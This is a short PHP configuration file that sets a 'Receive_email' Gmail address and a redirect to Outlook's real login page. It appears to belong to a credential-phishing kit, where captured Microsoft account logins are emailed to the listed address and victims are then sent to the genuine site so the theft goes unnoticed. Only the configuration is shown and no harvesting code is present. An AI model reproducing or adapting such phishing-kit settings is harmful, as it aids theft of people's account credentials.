<?php 
$Receive_email=" longmel647@gmail.com";
$redirect="https://outlook.live.com/";
?>